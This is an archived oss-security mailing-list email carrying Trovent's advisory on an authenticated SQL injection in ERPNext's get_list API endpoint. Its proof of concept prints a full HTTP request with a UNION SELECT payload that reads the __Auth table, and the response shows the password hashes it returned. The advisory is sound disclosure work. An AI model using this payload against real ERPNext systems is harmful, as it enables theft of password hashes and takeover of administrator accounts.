X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6122" "Tuesday" "11" "May" "2021" "11:45:56" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "174" "[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0" nil nil nil "5" nil nil (number mark "U       s.pietsch@tr May 11  174/6122  " thread-indent "\"[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27764 invoked by uid 550); 11 May 2021 11:57:08 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 21752 invoked from network); 11 May 2021 11:46:10 -0000
Date: Tue, 11 May 2021 11:45:56 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail3; t=1620733559;
	bh=VUp3W1DKEFFSPnRnZWW5KHoUeqVZ3RodprBKDzT18NU=;
	h=Date:To:From:Reply-To:Subject:From;
	b=beiGs+7pnaGdlXbHNLdqC5nV8q7WtLaiKvCDdu3ZsRg9iVnY+C+mx3FMntuQtW8gB
	 V7d4PTgpbdyEBDViyaOs9nTWxgXCwf4IGmiR/x9atU54qASdLSJOI5J/w6m0ZrWzKV
	 5HVTk8965rX/Nn4sJzteSSH4ON1CuyFQcnCP5iIE+4ID06FBuKJsOV0N+423z6Qmjw
	 0vew5H4P2BuKj0B/GSSpQODaySBDPBeiGvnSMCInev4aI1vqhrz/wvFvHULYiycjEc
	 1SBQdCgt0C7tDVfzBjjfSVKIqYi5H3GzLdoKifCfNFndzZwzetBaCz06EjRApq3gXG
	 X4m3OFnAOYDnQ==
To: "fulldisclosure@seclists.org" <fulldisclosure@seclists.org>, "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>, "submissions@packetstormsecurity.com" <submissions@packetstormsecurity.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <IV6PM0BF5xvdzKqp9Gl1kRbVbEwYHfBEis05qRSkaueB_f4cQIXWBj1jnUqgcX6lQ3ezklmmLiAv-y93PQVQwzIGIcu46GPqBbu57QP8nkI=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="---------------------b87c392d4e73cb771de7a3755745f6e3"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2103-01 / Authenticated SQL injection in ERPNext 13.0.0/12.18.0

-----------------------b87c392d4e73cb771de7a3755745f6e3
Content-Type: multipart/mixed;boundary=---------------------4f1c175b1982d7f9ca2407db5f41036b

-----------------------4f1c175b1982d7f9ca2407db5f41036b
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2103-01 #
#####################################


Authenticated SQL injection in ERPNext 13.0.0/12.18.0
#####################################################


Overview
########

Advisory ID: TRSA-2103-01
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2103-01
Affected product: ERPNext
Tested versions: 12.18.0 and 13.0.0 beta
Vendor: Frapp=C3=A9 Technologies https://frappe.io
Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch


Detailed description
####################

Trovent Security GmbH discovered an SQL Injection vulnerability
in the "frappe.model.db_query.get_list" API endpoint.
On version 13.0.0 valid credentials without any privileges are sufficient
but on version 12.18.0 at least "system_user" privileges are required.
The vulnerable parameter "filters" allows injection of SQL statements.
An attacker is able to query all available database tables to retrieve
usernames, password hashes or password reset tokens which can then be used
to reset administrator passwords.


Severity: High
CVSS Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
CWE ID: 89
CVE ID: TBD


Proof of concept
################

Sample request made with a non system account to retrieve password hashes:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


GET /api/method/frappe.model.db_query.get_list?filters=3D%7b%22name%20UNION=
%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a%20%22administrator=
%22%7d&fields=3D%5b%22name%22%5d&doctype=3DUser&limit=3D20'%3b%20do%20sleep=
(10)&order_by=3Dname&_=3D1615372773071 HTTP/1.1
Host: erpnext.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
/78.0
Accept: application/json
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bc=
f3
X-Frappe-CMD:
X-Frappe-Doctype: Dashboard%20Settings
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://erpnext.local/app/website
Cookie: io=3DNVosyhHCvV3KdkxNAAi7; sid=3D26f7ddefef642c0f88b9babfc26b751229=
c32b565304f30815d8ec22; system_user=3Dno; full_name=3Dauth%20test%27; user_=
id=3Dauth%40trovent.io; user_image=3D


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~



RESPONSE:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


HTTP/1.1 200 OK
Server: nginx/1.19.7
Date: Wed, 10 Mar 2021 16:04:40 GMT
Content-Type: application/json
Connection: close
Vary: Accept-Encoding
Set-Cookie: sid=3D26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22;=
 Expires=3DSat, 13-Mar-2021 16:04:40 GMT; HttpOnly; Path=3D/; SameSite=3DLax
Set-Cookie: system_user=3Dno; Path=3D/; SameSite=3DLax
Set-Cookie: full_name=3Dauth%20test%27; Path=3D/; SameSite=3DLax
Set-Cookie: user_id=3Dauth%40trovent.io; Path=3D/; SameSite=3DLax
Set-Cookie: user_image=3D; Path=3D/; SameSite=3DLax
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=3D63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=3Dblock
Content-Length: 719

{"message":[{"name":"$pbkdf2-sha256$29000$0fofo/SeE0IoRQgh5HyvVQ$IuyDVu5v4H=
c4Z7Pe/3Tvpim7AdhbYrI9b9XXL39/tVU"},{"name":"$pbkdf2-sha256$29000$1vqfk3KO0=
ZqT8n7vvff.nw$A9a6k9wbegrw5QUiJ/jj1.kXCr.lwRSJtv5S7QTCQgU"},{"name":"$pbkdf=
2-sha256$29000$aA2B8P7/X.vd./.fM6aUkg$JluCIXXrUgKxTUwvRyveCRIDjJ0mhhoG9Cs6o=
nAO2Do"},{"name":"$pbkdf2-sha256$29000$CSFEKCVEqPVe611rrdVayw$pFf/iBuprNIdZ=
4DoJadro0UUNaffy.2v5EbAe4Nbxco"},{"name":"$pbkdf2-sha256$29000$L2WMkdLaG2NM=
6V3rnXMOAQ$snURvXF1kNTGA7Zux.HLoQ5JISRajyOBiAZ1VDjEJnc"},{"name":"$pbkdf2-s=
ha256$29000$r/UeQ.id0/rfm9M6Z4yR8g$1w/oAvTRNJ7wKuSHgZ.4jkDHQAvLLYxerzYeHpd1=
IV8"},{"name":"gAAAAABgP1dTiYpJ67JyyUjytcay4XmKoOuyf_jAke7slDwL4gIM5lCWCbu6=
SjYOPOX6WigAm0fZzGgTEIiXNCA_yPZI64ijmA=3D=3D"}]}


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

To mitigate this vulnerability, we recommend to limit access to the affecte=
d API endpoint.
As a permanent solution it is recommended not to insert user input directly=
 into SQL queries.


History
#######

2021-03-10: Vulnerability found
2021-03-11: Advisory created and vendor contacted
2021-03-22: Vendor replied that they request CVE IDs after a fix is released
2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
2021-05-03: Vendor contacted, asking for status
2021-05-07: No reply from vendor, vendor contacted again
2021-05-11: Advisory published

-----------------------4f1c175b1982d7f9ca2407db5f41036b--

-----------------------b87c392d4e73cb771de7a3755745f6e3
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJgmm5rACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6FjrcEPQ/+MZAHdjJaC1Tut51Tltn3iSnLPB6KQGpcaYVap+9nyN5MJnHX
tkUeQJBGzvlYG89Q6vXBCemd/cBVLFc10kp81qpAP+nDYbQmZgO70p8dUPxX
Hfj5sS5I1MsxNsnKwz5ZJ5/3n2BfP2+jOJuzHsOdaDiQaPpxY3sDDUdjtkkg
TbQjAeqPgU/iJQAzWzcGItgDyEs0mMi5EG1eX61gD2Q1e2mAv6Vm3JXSS1iM
MlA4sLkEncxuKZGjpLyV3VXz/z3FMLclfYKXN1ViQtqe/NOZW5IF0GZdGXYb
RSd46dUsVbdkcl7uJ+16PBmv7iDGpwOmbnjg91e7an9qy97mxzdfFmauqa+c
PBPe9OTlMD7KvAeyZfd1J2sxot4JnoafofX7zlMzITGW4OnMPMOYnUXP0C/p
FUF3BlvF+2EoECCSggzNy7uNfj/xePkf7I3fqYf3Az53SKD14lyDyfC0vWvM
myJc6U6IaGFokLjXlM7w0bgRzZcFQpOhAzCnzqHGfv5VwJ2QvAcZo5Es3nZP
WWQRwEEaoRUvmJeQeGfN7yD9BUtBHTKmFgbT0SdAKdpPH8BMdnitVNOHo2Vx
y6ehdYeEyB96xRDC8GoiuoBxKDzg0X9oGUFvuVuJHzTQgm7MqG4L+TPL34Wc
dTGnFQ9M0GQ9vLMDKy98mnrRN1iFTGpSOEE=
=TZJp
-----END PGP SIGNATURE-----


-----------------------b87c392d4e73cb771de7a3755745f6e3--

